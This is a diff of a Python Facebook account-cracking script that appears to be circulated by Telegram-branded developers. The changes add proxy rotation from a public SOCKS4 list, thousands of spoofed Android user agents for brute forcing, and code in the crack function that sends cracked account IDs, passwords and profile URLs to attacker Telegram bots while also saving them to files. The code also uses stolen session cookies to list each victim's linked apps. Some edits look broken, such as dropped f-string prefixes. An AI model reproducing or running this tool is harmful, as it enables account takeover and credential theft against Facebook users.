@@ -1,39 +1,3 @@
-import requests
-import random
-import os
-import uuid
-import json
-import user_agent
-import time
-import sys
-import socket
-import datetime
-from datetime import date
-
-name = 'xdZwuHHS'  # تعريف المتغير name هنا
-
-def chk():
-    uuid = str(os.geteuid()) + str(os.getlogin())
-    id = "-".join(uuid)
-    print("   \x1b[1;38;5;121m[𝗬𝗢𝗨𝗥 𝗞𝗘𝗬]-[ مفتأحك ] : " + id)
-    try:
-        httpChat = requests.get("https://pastebin.com/raw/GTs1hmei").text
-        if id in httpChat:
-            print("   \x1b[38;5;161mتم التحقق بنجاح")
-            msg = str(os.geteuid())
-            time.sleep(1)
-            pass
-        else:
-            print("   \x1b[1;93m لم يتم العثور على اشتراكك vip خاص بك")
-            print("   \x1b[38;5;208mفضلاً قم بزيارة صفحة التواصل لل اشتراك في المدفوع [@R_A_J_Y-@K_L_D")
-            time.sleep(1)
-            sys.exit()
-    except Exception as e:
-        print("\033[1;30mخطأ ما حدث: ", e)
-        sys.exit()
-
-for _ in range(3):
-    chk()
 import os
 import requests
 import time
@@ -396,6 +360,39 @@ from bs4 import BeautifulSoup as sop
 import requests,bs4,json,os,sys,random,datetime,time
 from concurrent.futures import ThreadPoolExecutor as tred
 import threading
+import requests,os,sys,random, re
+from rich.console import Console as NETWORK_KURD
+from concurrent.futures import ThreadPoolExecutor as THREADING
+from rich.panel import Panel as ALOAN
+from rich import print as PRENTO
+CON=NETWORK_KURD() 
+ugen2=[]
+ugen=[]
+cokbrut=[]
+ses=requests.Session()
+princp=[]
+try:
+	PROXY = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt').text
+	open('PROXYZ.txt','w').write(PROXY)
+except:pass
+PROXY=open('PROXYZ.txt','r').read().splitlines()
+def generate_user_agent_android():
+    version_a = f'{random.randrange(1, 9)}.{random.randrange(1, 9)}'
+    device_a = '11; Redmi Note 5A Lite)'
+    extras_a = f'{random.randrange(100, 9999)} AppleWebKit/537.36 (KHTML, like Gecko) {random.randrange(1, 9)}.{random.randrange(1, 4)}.{random.randrange(1, 4)}.{random.randrange(1, 4)} Chrome/96.0.4664.45 Mobile Safari/537.36'
+    return f'Mozilla/5.0 (Linux; Android {version_a} {device_a} {extras_a}'
+ugen2 = [generate_user_agent_android() for _ in range(10000)]
+def generate_user_agent_android_12():
+    version_b = '12;'
+    device_b = 'M2101K6G'
+    letter = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    number = random.randrange(1, 999)
+    extras_b = f'Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) {random.randrange(80, 103)}.0.0.{random.randrange(4200, 4900)} {random.randrange(40, 150)} Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]'
+    return f'Mozilla/5.0 (Linux; Android {version_b} {letter}{device_b}{number}{letter}) {extras_b}'
+ugen = [generate_user_agent_android_12() for _ in range(10000)]
+id, id2, loop, ok, cp, akun, oprek, method, taplikasi, uid = [], [], 0, 0, 0, [], [], [], [], []
+cokbrut = []
+pwpluss, pwnya = [], []
 os.system('clear')
 pretty.install()
 CON=sol()
@@ -5273,19 +5270,25 @@ def crack(idf,pwv):
 			if "checkpoint" in po.cookies.get_dict().keys():
 				print('\n')
 				cp+=1
-				ali = f'''⋘━━━━━━━﴾𓆩𝐃𝐄𝐀𝐃𓆪﴿━━━━━━━⋙
+				ali = '''⋘━━━━━━━﴾𓆩𝐃𝐄𝐀𝐃𓆪﴿━━━━━━━⋙
 ﴾𝐕𝐈𝐏﴿﴾𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄﴿ = {idf}\n
 ﴾𝐕𝐈𝐏﴿﴾𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃﴿ = {pw}\n
 ﴾𝐕𝐈𝐏﴿﴾𝐃𝐀𝐓𝐄﴿ = {tahun(idf)}\n
+﴾𝐕𝐈𝐏﴿﴾𝐔𝐑𝐋﴿ = https://www.facebook.com/profile.php?id={idf}\n
 ⋘━━━━━━━﴾𓆩𝐃𝐄𝐀𝐃𓆪﴿━━━━━━━⋙
 ➺𝐌𝐑•𝐃𝐄𝐕:-@R_A_J_Y @K_L_D'''
-				requests.get('https://api.telegram.org/bot' + str(kld) + '/sendMessage?chat_id=' + str(sos) + '&text=' + str(ali))
+				url = f"https://api.telegram.org/bot{kld}/sendVideo"
+				data = {
+				"chat_id": sos,
+				"video": "https://t.me/GGPPE/14",
+				"caption": ali
+				}
 				statuscp1 = nel(ali, style='red')
 				cetak(nel(statuscp1, title='CP'))
 				open('/sdcard/𝚁𝙾𝚁-𝙲𝙿.txt', 'a').write(idf+'|'+pw+'|'+joined+'\n')
 				cp+=1
 				akun.append(idf + '|' + pw)
-				requests.get('https://api.telegram.org/bot' + str(kld) + '/sendMessage?chat_id=' + str(sos) + '&text=' + str(ali))
+				
 				soso = f'''
 				صاحب الايدي صاد حساب (ID)'''
 				requests.get('https://api.telegram.org/bot' + str(moon) + '/sendMessage?chat_id=' + str(sun) + '&text=' + str(soso))
@@ -5295,18 +5298,24 @@ def crack(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				print('\n')
-				rajy = f'''⋘━━━━━━━﴾𓆩𝐋𝐈𝐕𝐄𓆪﴿━━━━━━━⋙
+				rajy = '''⋘━━━━━━━﴾𓆩𝐋𝐈𝐕𝐄𓆪﴿━━━━━━━⋙
 ﴾𝐕𝐈𝐏﴿﴾𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄﴿ = {idf}\n
 ﴾𝐕𝐈𝐏﴿﴾𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃﴿ = {pw}\n
 ﴾𝐕𝐈𝐏﴿﴾𝐃𝐀𝐓𝐄﴿ = {tahun(idf)}\n
+﴾𝐕𝐈𝐏﴿﴾𝐔𝐑𝐋﴿ = https://www.facebook.com/profile.php?id={idf}\n
 ⋘━━━━━━━﴾𓆩𝐋𝐈𝐕𝐄𓆪﴿━━━━━━━⋙
 ➺𝐌𝐑•𝐃𝐄𝐕:@R_A_J_Y @K_L_D'''
 				cek_aya(kuki)
-				requests.get('https://api.telegram.org/bot' + str(kld) + '/sendMessage?chat_id=' + str(sos) + '&text=' + str(rajy))
+				url = f"https://api.telegram.org/bot{kld}/sendVideo"
+				data = {
+				"chat_id": sos,
+				"video": "https://t.me/GGPPE/12",
+				"caption": rajy
+				}
+				response = requests.post(url, data=data)
 				statusok1 = nel(rajy, style='green')
 				cetak(nel(statusok1, title='OK'))
-				open('/sdcard/𝚁𝙾𝚁-𝙾𝙺.txt', 'a').write(idf+'|'+pw+'|'+joined+'\n')
-				requests.get('https://api.telegram.org/bot' + str(kld) + '/sendMessage?chat_id=' + str(sos) + '&text=' + str(rajy))
+				open('/sdcard/𝚁𝙾𝚁-𝙾𝙺.txt', 'a').write(idf+'|'+pw+'|'+joined+'\n')				
 				sara = f'''
 				صاحب الايدي صاد حساب (ID)'''
 				requests.get('https://api.telegram.org/bot' + str(moon) + '/sendMessage?chat_id=' + str(sun) + '&text=' + str(sara))
@@ -5410,9 +5419,9 @@ def cek_aya(kuki):
     x = sop.find("form",method="post")
     game = [i.text for i in x.find_all("h3")]
     if len(game)==0:
-        print(f'%s{P}[%s×%s] %sSorry there is no Active  Apk%s         '%(N,M,N,B,N))
+        print(f'%s{P}[%s×%s] %s𝐒𝐨𝐫𝐫𝐲 𝐭𝐡𝐞𝐫𝐞 𝐢𝐬 𝐧𝐨 𝐀𝐜𝐭𝐢𝐯𝐞  𝐀𝐩𝐤%s         '%(N,M,N,B,N))
     else:
-        print(f'[🔥] %s ☆ Your Active Apps ☆     :{B}'%(GREEN))
+        print(f'[🔥] %s ☆★ 𝗬𝗼𝘂𝗿 𝗔𝗰𝘁𝗶𝘃𝗲 𝗔𝗽𝗽𝘀 ★☆     :{B}'%(GREEN))
         for i in range(len(game)):
             print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
     w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
@@ -5422,7 +5431,7 @@ def cek_aya(kuki):
     if len(game)==0:
         print(f'%s[%s!%s] %sSorry there is no Expired Apk%s                \n'%(N,B,N,M,N))
     else:
-        print(f'[✔] %s ☑ Your Expired Apps ☑    :{WHITE}'%(M))
+        print(f'[✔] %s ☑ 𝗬𝗼𝘂𝗿 𝗘𝘅𝗽𝗶𝗿𝗲𝗱 𝗔𝗽𝗽𝘀 ☑    :{WHITE}'%(M))
         for i in range(len(game)):
             print(f"[%s%s] %s %s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
         else:
